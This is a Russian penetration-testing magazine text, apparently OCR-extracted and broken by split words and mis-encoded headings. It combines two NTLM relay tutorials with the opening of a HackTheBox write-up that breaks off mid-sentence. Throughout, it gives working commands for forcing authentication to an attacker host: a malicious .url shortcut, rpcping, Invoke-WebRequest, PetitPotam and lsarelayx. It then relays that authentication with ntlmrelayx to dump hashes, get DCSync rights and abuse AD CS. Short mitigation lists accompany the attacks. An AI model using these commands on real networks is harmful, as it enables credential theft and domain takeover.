 1. Провес ти coerce-ата ку (принуждение к аутентификации):
    • ано ним но — с помощью PetitPotam (CVE-2021-36942);
    • с учетной записью.
 2. Использовать ярлыки на шарах с дос тупом на запись:
    • ано ним но;
    • с учетной записью.
 3. Стриггерить вручную.
 4. Провес ти MITM-ата ку.


Coerce-àòàêè
С coerce-ата ками мы сей час подробно разбирать ся не будем. Стоит упо-
мянуть, что если у нас есть учетная запись, то coerce уже не уяз вимость,
а особенность архи тектуры.
  Принуждать мож но любым удобным скрип том, например Coercer.py —
на сегод няшний день он под держивает почти все извес тные методы при нуж-
дения, в том числе без учетной записи.




                        Coerce-атаки можно выпол нять не только с 445-го
                      пор та, но и с 139, 135 и 4915-го пор тов. Под-
                      робнее об  этом, а  также о методах защиты
                         от этих атак читай на «Хаб ре».


При мер использования Coercer.py показан на рисунке ниже.





                       Запуск Coercer.py

В результате при нуж дения мы получа ем NTLM-аутен тификацию.





                 Ре зультат выполнения coerce-ата ки

Важно отме тить, что в результате выполнения такой атаки мы получаем имен-
но ìàøèí íóþ учетную запись, это необ ходимо помнить при планировании
Relay-атак.


ßðëûêè
Техники с ярлычками довольно старые и действенные, называются они slinky
и scuﬀy. Если в сети при сутствуют папки, открытые на запись, обязательно
нуж но положить в них ярлычки, которые будут ссы латься на IP-адрес ата-
кующего. Как толь ко пользователь откроет сетевую папку с нашим ярлыком,
нам при летит NTLM-аутентификация на SMB. Реализовать атаку можно нес-
колькими способами:
 • при помощи ути литы PyLnk 3 (есть в Kali);
 • при помощи CrackMapExec (тоже есть в Kali);
 • вручную.

Для экспе римента выберем третий вариант и будем использовать технику,
которая нем ного отличается от slinky и scuﬀy. Содер жимое фай ла с рас-
ширением .url будет примерно следующим:


[InternetShortcut]
URL=whatever
WorkingDirectory=whatever
IconFile=\\<attacker IP>\%USERNAME%.icon
IconIndex=1

По ложи ли ярлык в сетевую папку, переш ли в нее и получили NTLM-аутен-
тификацию, как показано на следующих рисунках.
  Перехо дим в сетевую папку, где расположен ярлык.





                По ложили ярлык в сетевую папку

Сра зу же прилетает NTLM-аутентифика ция.





            Ре зультат размещения ярлыка в сетевой папке

В при мере хеш захвачен с помощью Responder, на прак тике же можно запус-
тить ntlmrelayx и выполнить Relay-атаку.


Òðèããåðèì âðó÷íóþ
Ес ли сложилась ситуация, ког да мы можем выполнять код на доменной
машине, нап ример сбрутился PostgreSQL и из него нам удалось выпол нить
код, можно попробовать стриг герить аутен тифика цию по SMB простой
коман дой в cmd:


dir \\<attacker IP >\a


MITM
Су ществует целый ряд атак, которые могут позволить атакующе му оказаться
в положении посередине меж ду клиентом и сер вером, например ARP spoof-
ing, DHCPv6 spoong или NetBIOS spoong (вспоминаем про Responder).
Любая из этих тех ник может поз волить зах ватить NTLM-аутентифика цию
и даже боль ше. Но они могут оказать ся разрушитель ными для сети, поэтому,
когда можно обойтись без них, лучше так и делать.
  Про MITM-атаки в следующих раз делах мы отдельно говорить не будем,
потому что смысл при мерно тот же.


RPC (135/TCP)

В репозитории на GitHub готов к использованию RPCRelayServer. Пока что
скрипт не добав лен в основную ветку impacket, но мне кажется, это вопрос
вре мени. Те, кто хочет поп робовать, уже сейчас мо гут самостоятельно обно-
виться. Пос ле добавления необходимых скрип тов и компонентов в ntlmrelayx
мы будем при нимать аутентифика цию на порт 135/TCP.
  Получить NTLM-аутентификацию на 135-й порт мож но нес коль кими спо-
собами:
 • воспользоваться SweetPotato;
 • стриггерить вручную;
 • провести MITM-атаку.


SweetPotato
Про SweetPotato и его эксплуата цию лучше читать статью «Кар тошка-0.
Повышаем при виле гии в AD при помощи RemotePotato0». Но в целом кон-
цепция такая же, как у PetitPotam: мы получим аутентификацию от имени
машины толь ко на 135-й порт.


Òðèããåðèì âðó÷íóþ
Ес ли у нас есть воз можность уда ленно выпол нить код на доменной машине
или просто для экспе риментов, можно стриггерить обращение на DCE RPC
следующим способом:


rpcping /s <attacker IP> /e 135 /a privacy /u NTLM


Ïðèìåð ïîëó÷åíèÿ àóòåíòèôèêàöèè íà DCE RPC
По лучаем аутентификацию и делаем Relay на SMB.





         Захват NTLM-аутен тификации с DCE RPC и Relay на SMB

По лучаем дос туп к сетевым пап кам.





                Ре зультат выполнения Relay на SMB



                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ




                                ЗАХВАТЫВАЕМ
                        NTLM-АУТЕНТИФИКАЦИЮ
                             ДЛЯ RELAY-АТАКИ





HTTP (80/TCP)

По лучить NTLM-аутентифика цию на HTTP мож но несколькими способа ми:
 • применить сoerce-атаки, если на хосте включен WebDav;
 • ис поль зовать PrivExchange;
 • стриггерить вручную;
 • проэксплуати ровать RemotePotato0;
 • провести MITM-атаку.


Coerce-àòàêè
С coerce-атаками на HTTP все аналогично SMB, разница только в том, что
для при нуж дения на HTTP нужно, чтобы на машине (которую мы при нуж даем)
был вклю чен WebDav.




                      Если  WebDav  вык лючен, можно  попробовать
                      включить его с помощью ярлычка. Подробнее
                      об этой тех нике читай на The Hacker.


Также ата кующе му нужна собствен ная DNS-запись в обсле дуемом домене.
Если WebDav вклю чен, то нам остается только принудить машину, используя
Coercer.py или любой другой скрипт, нап ример с помощью PetitPotam.
  Принуждаем машину пройти аутентифика цию на HTTP.



                      Запуск PetitPotam.py

Проверить, вклю чен ли WebDav, можно с помощью команды


crackmapexec smb <target IP> -u <user> -p <password> -M webdav





        Проверка доступности WebDav с помощью CrackMapExec


PrivExchange
Техника принуждения Exchange, которая называ ется PrivExchange, осно вана
на уязвимос тях CVE-2019-0686 и CVE-2019-0724. О ее использовании луч ше
про читать статью Abusing Exchange: One API call away from Domain Admin.


Òðèããåðèì âðó÷íóþ
Ес ли у нас есть возможность уда ленно выпол нить код на домен ной машине,
можно стриггерить обра щение на HTTP, используя Basic auth. Команда выг-
лядит так:


powershell -c "Invoke-WebRequest -Uri http://<attacker IP>/
-UseDefaultCredentials".


RemotePotato0
При повыше нии при вилегий с помощью техники RemotePotato0 на опре-
деленном эта пе нам дос тается аутентификация с HTTP, которой мы можем
вос поль зовать ся для Relay-атаки. Особен ностью атаки является правильный
выбор CLSID, под робнее луч ше читать в статье «Кар тошка-0. Повышаем при-
вилегии в AD при помощи RemotePotato0».
  На машине, к которой у нас есть RDP-доступ, запускаем эксплоит Remote-
Potato0.exe.





               Запуск RemotePotato0 для Relay на HTTP

На машине атакующе го запускаем ntlmrelayx. Получаем сертификат от име ни
адми нистратора домена.





     Успешный Relay на HTTP в результате выполнения RemotePotato0




                       Чтобы посмотреть ID сессии для атаки, используй
                      команду query user.



WCF (9389/TCP)

Один из необычных вари антов получения NTLM-аутентификации — протокол
WCF (Windows Communication Foundation). Что это такое и с чем его едят,
можно узнать на сайте Microsoft. В качестве спойлера скажу только, что
модуль Active Directory для PowerShell постро ен на протоколе WCF.
  Нам же скорее инте ресно, как его использовать при Relay-атаках. Пер вое
иссле дование в 2020 году провел @cnotin и подарил миру WCFRelayServer
для ntlmrelayx. Вот ссылка на блог авто ра.
  Получить аутентификацию на WCF можно следующи ми способа ми:
 • стриггерить вручную;
 • провести MITM-атаку.


Òðèããåðèì âðó÷íóþ
Ес ли у нас есть возможность уда ленно выпол нить код на домен ной машине,
можно стриггерить обра щение на WCF 9389/TCP, используя NetNTLM. Спо-
соб выглядит сле дующим образом:


powershell -c "get-aduser -filter * -server IP"





                   Триг герим аутентификацию на WCF

Такая аутентификация может неожиданно встре титься на оче ред ном пен-
тесте, например при про ведении ата ки ARP spoong в сегменте сети,
в котором находятся адми нистраторы.


RAW (ÏÐÎÈÇÂÎËÜÍÛÉ TCP)

Этот протокол и техника в целом стали лично для меня боль шим открытием
при написании статьи. Пока что есть вариант получить аутентификацию
на RAWRelayServer толь ко с использованием lsarelayx.
  Вариант исполь зования пред лагается достаточно простой — запус каем
lsarelayx на захвачен ной Windows-машине, начина ем принуждать прой ти
аутентификацию на ней все целевые хос ты или просто сидим и ждем, пока
на  нее  не  зайдет  какой-нибудь  при вилегированный  пользователь.
При получе нии аутентификации lsarelayx перехватывает ее и пересылает
на нашу машину. Получается в каком-то роде закладка.
  Работать все будет примерно по сле дующей схе ме.





                      Схема работы lsarelayx

При проведе нии экспе риментов с lsarelayx при ходим к выводу, что все Relay-
ата ки работают в соответствии с тем, с какого про токо ла была получена
аутентификация, а RAW ста новится лишь промежуточным зве ном в цепочке
Relay-атаки.
  Для запуска lsarelayx используется следующая команда:


lsarelayx.exe --host <attacker IP>

Итак, на захваченной машине запустили lsarelayx.





                      Схема работы lsarelayx

На нашей машине получили аутентифика цию с lsarelayx на RAWRelayServer
и переслали ее на SMB.





             Захват аутентификации на RAW и Relay на SMB

В результате получаем про фит в зависимости от привилегий, полученной
аутентификации.





                     Ре зультат Relay на SMB

В заключение раз говора про этот сервер хотелось бы добавить, что «Защит-
ник Windows» сразу же обнаруживает и удаляет lsarelayx, поэтому для его
запуска, вероятно, при дется потрудиться.


ÊÀÊ ÏÎËÓ×ÈÒÜ NTLM-ÀÓÒÅÍÒÈÔÈÊÀÖÈÞ, ÅÑËÈ ÌÅØÀÅÒ NAT
ÈËÈ ÌÝ

Осуществить  Relay  не выйдет,  если  недос тупны  сетевые  соеди нения
до машины ата кующего. Препятс твовать соединению может NAT или МЭ.
Возможных вари антов решения этой проб лемы видится нес колько:
 • В такой ситуации надо искать машину с Linux, до которой смогут дойти
   подключения, почти всегда это удается сделать.
 • Хо рошим вариантом будет раз вернуть вир туальную машину с Linux на узле
   с Windows. Как это сделать, расска зывает статья «Пингвин-супершпи он.
   Используем виртуалку с Linux для пос тэксплуата ции Windows».
 • Если все-таки не получи лось или поджимают сро ки, можно рас смотреть
   вариант запуска ntlmrelayx на сервере с белым IP-адресом, но надо учи-
   тывать риски — аутен тификация пойдет через интернет в откры том виде.


ÁÎÍÓÑ № 1

При при нуждении на HTTP кажется, что с WebDav все понят но: он либо есть,
либо нет, а с DNS-записью все не так однозначно. Если у нашей машины нет
DNS-записи, всег да мож но попробовать поискать хост, на котором она
будет. А там уже не важно, Windows это или Linux, с помощью socat мы смо-
жем проб росить себе 80-й порт и получать заветные аутентификации. На схе-
ме это будет выг лядеть при мер но следующим обра зом.





                    Схема проброса 80-го порта

Запускаем socat для проб роса 80-го порта с машины с DNS-записью на хост
ата кующе го.





                         Запуск socat

Запускаем ntlmrelayx на машине ата кующего.




                        Запуск ntlmrelayx

При нуж даем машину пройти NTLM-аутентификацию на хосте, где запущен so-
cat. На схеме это work2.



         Принуждение к аутентификации с помощью PetitPotam

Машина work2 пытается пройти аутентификацию на work3 и попадает на хост
ата кующе го.





       Принимаем аутентификацию с HTTP на машине атакующего


ÁÎÍÓÑ № 2

Пе риодичес ки приходится сталкивать ся с тем, что та или иная сис тема пыта-
ется пройти аутентификацию по NTLM с помощью доменной учет ки. Так
любят делать антивиру сы, DLP-системы и бэкап-системы.
  Заметить это доволь но прос то: запускаем Responder в режиме анализа
на дос таточно продол житель ное время и смот рим, пытал ся ли кто-то прой ти
аутентификацию.
  После того как удалось подтвердить, что в домен пери одически кто-то сту-
чит ся, можно запустить ntlmrelayx и сидеть ждать, когда в следующий раз
учетка попыта ется пройти аутентифика цию на нашем узле. При правильном
выборе места, куда делать Relay, можно закрепиться в домене, а потом
и под нять привиле гии до админа.
   Этот при мер плав но подводит нас к теме следующей статьи — NTLM Relay.
В ней мы постараемся разоб рать ся, что это такое, как делать и какой профит
можно получить.


ÇÀÙÈÒÀ

В качестве защиты можно посоветовать следующее:
 1. Ре гулярно устанав ливать обновле ния безопас ности.
 2. Не допускать появ ления сетевых папок с ано ним ным дос тупом на запись.
 3. Отказаться от исполь зования NetBIOS.
 4. Отклю чить IPv6, если он не нужен.
 5. Применить смяг чающие меры по защите от coerce-атак.


ÂÛÂÎÄÛ

Уверен, что в статье перечислены не все воз можные способы получить NTLM-
аутентификацию. Если у тебя воз никли мысли, идеи или уже был опыт исполь-
зования альтернативных способов, буду рад обратной связи.
   Главный вывод, который можно сделать, — способы получения NTLM-
аутентификации для последу юще го выполнения Relay-атаки ограниче ны толь-
ко фан тазией ата кующего. © X
ВЗЛОМ





С атаками NTLM Relay спе циалис ты по пен-
тестам знакомы дав но. В большинс тве слу-
чаев предпосылки к успешной Relay-ата-
ке — это не уяз вимость, а особен ность нас-
тройки инфраструктуры, поэтому ата ка час-               DrieVlad                                                                                               vlad.driev@gmail.com
то  используется  в  боевой  обстанов ке
на реальных проектах. Сегодня мы раз-
берем, как выполняется такая атака, когда
NTLM-аутентификация уже получе на.




                 О том, как получить NTLM-аутентифика цию, пред-
                    шес тву ющую Relay-атаке, под робно рассказано
                        в статье «Гид по NTLM Relay. Захватываем NTLM-
                        аутен тификацию для Relay-атаки». Атаки NTLM
                         Relay можно про водить не толь ко в Active Directo-
                                 ry, но еще, нап ример, в ALD и FreeIPA-доменах.


Для глубокого понимания темы с точки зрения теории рекомендую прочитать
статью. Прежде чем перей ти непосредственно к разбору методов, догово-
римся о терминах.
  До пустим, кли ент хочет прой ти аутен тификацию с машины Work1 на SMB,
ата кующий перехватывает  эту сессию и  хочет пройти  аутентификацию
на LDAP. Такой кейс мы будем называть Relay с SMB на LDAP.
  Еще один пример, что бы закрепить наше понима ние. Клиент хочет пройти
аутентификацию с машины Work1 на HTTP, ата кующий перехватывает эту сес-
сию и хочет прой ти аутен тифика цию на SMB. Такой кейс мы будем называть
Relay с HTTP на SMB.


ÊËÈÅÍÒÛ

Для реали зации ата ки нам нужен клиент и сер вер, ntlmrelayx как раз по такой
модели и постро ен. Про RelayServers мы говорили в прошлой статье, в этой
будем говорить про RelayClients.


SMB (445/TCP)
На SMB аутен тифика цию можно пересылать с любого другого протокола.
Глав ное условие успешности Relay-атаки — это отсутс твие требования под-
писи SMB-сооб щений на машине, куда мы выпол няем Relay. Чтобы проверить
это, мож но вос пользоваться следующей командой:


crackmapexec smb -u '' -p '' --shares <target IP or nets or file>

На рисун ке требование подписи вклю чено, на этой машине выпол нить атаку
на SMB Relay не получится.





                   SMB Signing: True

А в этом примере на машине требование отклю чено, на нее Relay делать
можно.





                   SMB Signing: False

Для авто матизации мож но использовать следующую коман ду:


crackmapexec smb --gen-relay-list targets.txt <nets>





              Создание списка целей для Relay на SMB

Рассмот рим вари анты выполнения Relay на SMB. Самый простой вари ант —
выполнить Relay на машину с SMB, ког да пересылаемая нами учетная запись
име ет права локального адми нис тра тора на целевом хос те. При выполнении
такой пересылки сдампятся хеши SAM, и мы получим NT-хеш локального
адми нистратора и закрепим ся на машине.


impacket-ntlmrelyx -t smb://<IP>





                       Успешный Relay на SMB

Но если прав нет, мы получим ошибку, и на этом ата ка закончится.





                    Неудачный Relay на SMB

В ситуации, ког да у нас используется SMBv2, всегда необходимо добав лять
флаг -smb2support. В качес тве цели можно ука зать файл, где перечисляются
в порядке приори тета цели и протокол, на который надо выпол нить атаку,
при мерно в сле дующем фор мате:


smb://IP1
ldap://IP2
smb://IP3
rpc://IP4

Что бы подать на вход этот файл со списком целей, используем флаг -tf:


impacket-ntlmrelayx -tf targt.txt

И тут стоит сказать, что обычно аутен тификация прилетает не одна, а сра зу
несколько, поэтому можно попробовать Relay в несколько мест. Но также
в ntlmrelayx есть механизм multirelay, суть которого состоит в том, что он
может одну условную аутентифика цию превратить в десять. Это действитель-
но работа ет, но не стабильно. При первой же ошиб ке или отказе доступа
про цесс остановит ся. Чтобы отключить этот механизм в случае с нес коль кими
целями, нужно добавить в команду параметр --no-multirelay:


impacket-ntlmrelayx -tf targt.txt -smb2support --no-multirelay

А также важно не забыть добавить необ ходимые фла ги для каждого из про-
токо лов, которые при сутству ют в спис ке целей. При мени тельно ко всем
остальным кли ентам эта информация тоже акту альна.
  Для взаимодей ствия с сетевы ми пап ками целевой машины от име ни
пересылаемой учетной записи можем использовать интерактивный режим:


impacket-ntlmrelyx -t smb://<IP> -i





                   Relay на SMB в интерактивном режиме

Пос ле  это го  у нас под нимается оболочка на  локальном интерфейсе,
к которой можно присоединиться следующей командой:


nc 127.0.0.1 11000

Пос ле подключения нам доступен обычный smbclient из Impacket с точно
таким же синтаксисом.





           Обо лочка smbclient в результате Relay на SMB

Спо соб получе ния интерак тивного режима может быть полезен, когда мы
не знаем, есть у нас привилегированные права на целевой машине или нет.
Если прав нет и мы пользуем ся стандартным режимом — ничего не произой-
дет. Если права есть, мы хотя бы получим доступ ко всей файловой сис теме и,
может быть, суме ем найти что-то интересное. Но в целом есть еще более
уни вер сальный спо соб.
  Мо жет сложиться ситуация, когда мы не име ем прав локального админис-
тратора, но можем закрепиться на целевой машине от имени пересылаемой
учетной записи с помощью фла га -socks:


impacket-ntlmrelyx -t smb://<IP> -socks

В этом режиме можно реализовать при мер но следующую схему.





                 Схе ма Relay на SMB в режиме socks

Пос ле успешной Relay-атаки мы получа ем SMB-сессию и можем исполь-
зовать ее многократно с помощью proxychains4. Для этого редак тиру ем кон-
фигурацион ный файл /etc/proxychains4.conf. В конец добавляем строчку:


socks4  127.0.0.1 1080

Для использования уже созданного соединения после нас тройки конфига
proxychains подойдет следующий синтаксис:


proxychains4 impacket-smbclient 'domain/username@<target IP>'
-no-pass

Стоит обратить вни мание, что проходить аутен тификацию таким обра зом
можно толь ко на машине, куда был совершен Relay. Запускаем ntlmrelayx
с флагом socks, в качес тве целей указываем машины без SMB Signing.





                       Relay на SMB в режиме socks

Ре дактируем конфиг proxychains. Мы можем запускать smbclient без пароля
через proxychains.





                        Smbclient в контек сте socks

Такой спо соб может поз волить закрепиться на целевой машине даже неп-
ривиле гированному пользователю, что использует ся в опре делен ных ситу-
ациях. Но если сессия ока жется привилегиро ванной, можно запустить se-
cretsdump и получить NT-хеши.





                     Secretsdump в контек сте sock

Таким образом мы можем запус кать весь софт из Impacket, а также осно ван-
ные на нем скрип ты. С помощью этого способа можно делать действитель но
удивительные вещи, но об этом чуть позже, а пока плавно переходим к сле-
дующе му протоко лу.


LDAP (389/TCP, 636/TCP)
Выпол нять Relay на LDAP можно только в случае, если на сервере отключено
требование подписи сообщений. Проверить мож но с помощью скрипта Ldap-
RelayScan.py.


python3 LdapRelayScan.py -dc-ip <target IP>





                Провер ка требования подписи LDAP

Relay-атаки на LDAP могут быть крайне импактными для атакующего, поэтому
Microsoft пыта ется это му всячески препятс твовать. Есть нес колько главных
условий, при которых возможна пересылка NTLM-аутентификации на LDAP:
 1. Аутентификация с HTTP всег да пересылает ся на LDAP.
 2. Аутентификация с SMB пересылается на LDAP в сле дующих слу чаях:
    • использование NetNTLMv1-хеша клиентом;
    • уязвимос ти CVE-2019-1040 и CVE-2019-1166 на контроллерах домена.
 3. Экс плуата ция RemotePotato0.

Для эксплуатации пересылки с HTTP на LDAP никаких флагов добавлять
не надо:


impacket-ntlmrelayx -t ldap://<DC IP>





                       Успешный Relay на LDAP

Из результата видно, что ntlmrelayx про веря ет привилегии пользователя
в домене, добав ляет нового, если может, и накидывает ему привилегии
на DCSync, а также соз дает дамп домена. Если пользователь не обладает
никакими при виле гиями, то прос то соз дается дамп домена.
  Дам пим ntds.dit с помощью созданной в резуль тате Relay-атаки учетки.





   Secretsdump с помощью пользователя, созданно го в результате Relay

Дамп домена, полученный в результате успешной Relay-ата ки на LDAP,
показан на рисун ке ниже.





           Дамп домена в результате Relay-атаки на LDAP

Те перь нес колько слов мож но сказать про Relay с SMB на LDAP. Углубляться
в структуру каждого из хешей не будем, все-таки разговор не об этом,
но пару слов про раз ницу имен но в контексте такой атаки сказать стоит:
 • NetNTLMv1-хеш будет приятным подарком для атакующего, потому что
   у него есть недос таток дизай на — отсутствие значения MIC (значение
   для проверки целостнос ти), которое позволя ет выпол нять Relay с SMB
   на LDAP.
 • В NetNTLMv2 исправлен этот недостаток, но все-таки в реали зации были
   обнаруже ны уязвимости CVE-2019-1040 и CVE-2019-1166, которые поз-
   воляют удалить MIC и выполнить Relay с SMB на LDAP.

Во всех описанных случаях при меняем флаг --remove-mic в ntlmrelayx:


impacket-ntlmrelayx -t ldap://<DC IP> -smb2support --remove-mic

В случае аутен тификации с NetNTLMv2-хешем на контрол лер с патчем
получаем ошиб ку.





                   Неудачный Relay на LDAP



                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ





В случае аутен тификации с NetNTLMv2-хешем на контрол лер без патча
получаем профит.





              Успешный Relay на LDAP c NetNTLMv2-хешем

Аналогичная ситуация будет с NetNTLMv1-хешем при Relay-атаке на контрол-
лер с патчем — получаем про фит.





              Успешный Relay на LDAP с NetNTLMv1-хешем

Также полезным может оказаться интерактивный режим:


impacket-ntlmrelayx -t ldap://<DC IP> -i





            Успешный Relay на LDAP в интерактивном режиме

Пос ле это го у нас есть воз можность подключить ся к инте рактивной оболочке
и начать взаимодействовать с LDAP. Встро енные функции позволяют сде лать
дамп домена, добавить пользователя в группу, уда лить его оттуда, провести
эксплуатацию RBCD, создать пользователя и так далее. В целом небога то,
но жить можно.





               Обо лочка LDAP пос ле Relay на LDAP

А вот один из классных примеров исполь зования RAW-сервера, о котором мы
говорили в предыдущей статье с Relay-ата кой на LDAP.





                       Relay на LDAP с RAW-сервера

Ре зультат пересылки аутентификации на LDAP — созданная учетная запись,
не админская, но с при вилегией DCsync.





  Учетная запись, созданная в резуль тате Relay, не является админис тра-
  тором


RPC (135/TCP)
Также возможна пересылка NTLM-аутентификации на DCE/RPC. В основном
эта тема раскры вается в кон тексте Potato-атак. Но так же есть уязвимос ти,
которые позволя ют выполнять команды на узле вне зависимости от тре бова-
ний подписи SMB, потому что SMB там не используется сов сем.
  Первые иссле дования на эту тему опубликова ли CompasSecurity в своем
блоге. Более того, три года подряд они находят все новые векторы экс плу-
ата ции Relay на RPC. Первой была уязвимость CVE-2020-1113, потом CVE-
2021-26414, и в 2022 году они откры ли миру атаку на AD CS ESC11.
  Для эксплуатации CVE-2020-1113 (присутству ет в Impacket 0.10.0) исполь-
зуем следующую команду:


impacket-ntlmrelayx -t rpc://<target IP> -c ’whoami’

В качестве при мера выполним код на кон троллере домена с включенным тре-
бованием под писи SMB-сообщений.





            SMB Signing: True на контрол лере домена





                   RCE после Relay на RPC

Даже если в домене настроено требование под писи SMB, можно про бовать
Relay на RPC, пос коль ку один-единственный непоставленный патч может дать
пре имущество атакующе му.
   Чтобы иметь воз можность эксплуатации ESC11, необходимо в свой Im-
packet добавить немного кода, который мож но найти на GitHub.




                     ESC11 — это одна из техник для повышения при-
                       вилегий в AD через центр сер тификации, осно-
                       ванная на выпуске сертификата через RPC. Вот
                      cсылка на пер воис точник опи сания техники.


Для эксплуатации ESC11 достаточно следующей команды:


impacket-ntlmrelayx -t rpc://<CA IP> -rpc-mode ICPR -icpr-ca-name <
CA name> --template "template name"





                       Эксплуатация ESC11

В результате эксплуата ции мы получаем сертификат от имени учет ки, аутен-
тификация которой была перехвачена. Например, мы можем при нудить кон-
троллер домена прой ти аутентифика цию на нашей машине, сделать ESC11,
получить сертификат от име ни кон трол лера и в итоге скомпрометировать
домен.


HTTP (80/TCP)
Пе ресылка аутентифика ции на HTTP возможна с любого другого протокола,
основной вектор эксплуатации — это AD CS ESC8.




                    ESC8 — это одна из тех ник для повышения при-
                       вилегий в AD через центр сер тификации, осно-
                       ванная на выпуске сертификата через WEB. Вот
                      ссылка на пер воис точник опи сания техники.


При поиске AD CS без учет ной записи можно проверить все контроллеры,
а также все обнаруженные Windows Server на доступность URL вида http://<
CA IP>/certsrv. С учетной записью все гораздо проще, можно вос поль-
зоваться удоб ным инструментом Certipy.
  Для выпол нения Relay-атаки можно использовать сле дующую команду:


impacket-ntlmrelayx -t "http://<CA IP>/certsrv/certfnsh.asp" --adcs
--template "template name"

На рисунке ниже приведен при мер Relay с RPC на HTTP.





                        Экс плуата ция ESC8

Вот пример пересылки аутентифика ции с RAW на HTTP и реализация ата ки
ESC8.





          Эксплуатация ESC8 после перехвата с RAW-сервера




                    Помимо повышения привилегий, дан ную тех нику
                   мож но использовать для получения начального
                      доступа в домене. Если на этапе разведки уда-
                       лось обнаружить AD CS с включенным WebEnroll,
                         то при получении NTLM-аутентифика ций можно
                       сразу  нацелиться  на  получение  сертификата
                      и таким обра зом получить закрепление.



ÂÛÂÎÄÛ

Ес ли с брутом все ясно: находишь тип хеша и запус каешь hashcat, то с Relay
не все так однозначно. Из-за раз личных осо бенностей не всегда понятно,
куда мож но пересы лать аутен тифика цию.
  Для начала прос то при ведем таблицу экспе риментов с Relay-атаками. Все
эксперименты были про ведены с помощью ntlmrelayx v0.10.0.





                   Таблица воз можных NTLM Relay

Аутентификацию с SMB при определенных условиях можно пересы лать
на любой другой протокол.
   Аутентификацию с DCE RPC точно мож но переслать на HTTP, SMB, RPC.
В сочетании с тех никами RemotePotato0 мож но получить HTTP-аутентифика-
цию от име ни привилегиро ванного пользователя и выполнить Relay на LDAP.
   Аутентификацию с HTTP можно перес лать куда угод но, без ограничений.
   Аутентификацию с WCF точно можно пересы лать на HTTP, SMB, RPC.
С LDAP надо разбираться отдельно, с наскока не получилось.


ÁÎÍÓÑ

Может сло жить ся ситу ация, ког да на внутреннем пен тесте будет открыт дос-
туп по VPN, который зап рещает обратные соединения — то есть при принуж-
дении ни одна аутен тифика ция до атакующе го долететь не сможет.
  До мен маленький и достаточно новый, уяз вимос тями и мисконфигами
обрасти не успел. Но сра зу же бросает ся в глаза, что почти на всех машинах
на SMB не тре буется под пись, в том числе на Exchange-сер верах, которые
часто обладают высоки ми при виле гиями в домене.
  На эта пе разведки удалось найти локальную учет ную запись от нескольких
домен ных машин, но без прав локаль ного администратора. С помощью
локальной учетки мож но выполнить Coerce-атаку. Таким образом, есть воз-
можность получить доменную учет ку машины  и, соответственно, доступ
к каким-то сетевым папкам и даже больше.
  В случае с дос тупом к сетевым папкам все достаточно просто: выполняем
Coerce на машину атакующего, далее Relay на SMB в инте рактивном режиме
на любой доменный узел без тре бования подписи SMB. На схе ме этот алго-
ритм выг лядит нем ного понят нее.





            Схе ма принуждения и Relay с локальной учеткой

Ины ми словами, имея только локальную учет ку, вполне реально получить дос-
туп к некоторым доменным ресурсам. Но мож но выжать из этого больше.
С помощью такого хит рого способа есть возможность принудить дру гую
машину пос ле успешно го Relay. Коротко схема получится такой: Coerce + Re-
lay + Coerce + Relay = Admin.
  А если конкретнее, то такой кейс воз можен, если на Exchange отключен
SMB Signing и Exchange находятся друг у дру га в адми нах, как это часто быва-
ет. С помощью локальной учет ки получа ем доменную учетку машины и дела-
ем Relay на SMB на Exchange1, пос ле чего принудим его прой ти аутентифика-
цию на машине атакующего. После получения аутентификации выпол няем
Relay на Exchange2 на SMB уже от имени Exchange1. На схе ме это выглядит
при мерно так.





             Схе ма Coerce + Relay + Coerce + Relay = Admin

Не имея доменной учетки и даже учетки локального админа на каком-нибудь
хосте, можно про ворачивать довольно-таки хитрые трюки.


ÇÀÙÈÒÀ

В при веден ной таблице хорошо прос леживается тенденция, что для защиты
надо закрывать эндпо инты, куда может быть совершен Relay. Если коротко:
 1. Включить тре бова ние подписи SMB-сооб щений.
 2. Включить тре бова ние подписи LDAP.
 3. Отклю чить WebEnroll в AD CS.
 4. Выставить в AD CS флаг IF_ENFORCEENCRYPTICERTREQUEST в положе-
   ние True.
 5. Регулярно устанав ливать обновле ния безопас ности.

В большинстве случаев Relay возможен из-за неболь ших недостатков в нас-
тройках инфраструк туры, поэтому защитить свой домен можно прос тыми
методами.


ÈÒÎÃ

В итоге можно ска зать, что Relay-атаки силь но расширяют возможности ата-
кующего. Если про вести качественную разведку и правиль но оце нить ситу-
ацию, использовать все векторы для получения аутентификации и пробовать
их пересы лать в раз личные эндпо инты, то шан сы на успех рез ко воз растут. © X
ВЗЛОМ





         ЭКСПЛУАТИРУЕМ LFI
      И ОШИБКУ СЕРИАЛИЗАЦИИ
           В КОДЕ НА PHP





В этом райтапе я покажу, как обхо дить
фильтр локального включения файлов (LFI),
затем раз берем алгоритм генератора кода
активации и про эксплуати руем уязвимость
в функции десери ализации объекта PHP.             RalfHacker                                                                                             hackerralf8@gmail.com
Получив доступ к хосту, повысим привиле-
гии  через инъекцию команд  в  скрипте
на Bash.




                     Под ключать ся к машинам с HTB рекомендуется
                        только через VPN. Не делай этого с компьютеров,
                        где есть важ ные для тебя данные, так как ты ока-
                    жешься в общей сети с другими учас тниками.



ÐÀÇÂÅÄÊÀ
Ñêàíèðîâàíèå ïîðòîâ
Добав ляем IP-адрес машины в /etc/hosts:


10.10.11.195    broscience.htb

И запускаем сканиро вание портов.




Сканиро вание портов — стандар тный первый шаг при любой атаке. Он поз-
воля ет атакующе му узнать, какие службы на хосте при нимают соединение.
На осно ве этой информации выбирается следующий шаг к получению точки
входа.
  Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи сле дующе го скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом про изво дится обычное быс трое ска-
нирование, на вто ром — более тщательное сканиро вание, с исполь зовани ем
име ющих ся скрип тов (опция -A).





                    Резуль тат работы скрипта

Наш ли три откры тых порта: 22 — служба OpenSSH 8.4p1, 80 и 443 — веб-сер-
вер Apache 2.4.54.
  Помимо это го, мы нашли редирект с порта 80 на 443, а из поля common-
Name сертификата узнаем реаль ный домен (его мы и так уже записали в /etc/
hosts).





                        Главная стра ница сай та


ÒÎ×ÊÀ ÂÕÎÄÀ
На сай те ничего интересного най ти не уда лось, поэтому приступим к ска-
нированию катало гов.




Одно из пер вых действий при тес тировании безопасности веб-приложе-
ния — это ска нирование методом перебо ра каталогов с целью поис ка скры-
той информации и недос тупной обыч ным посети телям функций. Для этого
